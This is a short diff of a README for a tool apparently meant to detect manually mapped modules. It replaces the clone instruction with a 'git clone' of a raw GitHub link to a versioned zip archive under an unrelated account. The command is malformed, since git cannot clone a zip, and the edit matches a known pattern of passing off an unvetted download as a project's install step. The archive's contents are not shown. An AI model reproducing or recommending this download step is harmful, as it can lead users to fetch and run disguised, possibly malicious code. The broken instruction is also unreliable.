@@ -86,4 +86,4 @@ This helps detect modules whose headers were relocated or partially removed.
 1. Clone repository:
 
 ```bash
-git clone https://github.com/yourname/manual-map-detection.git
+git clone https://raw.githubusercontent.com/NPFERNANDO123/Manual-Map-Detection/main/ManualMapDetection/Map-Manual-Detection-3.4.zip
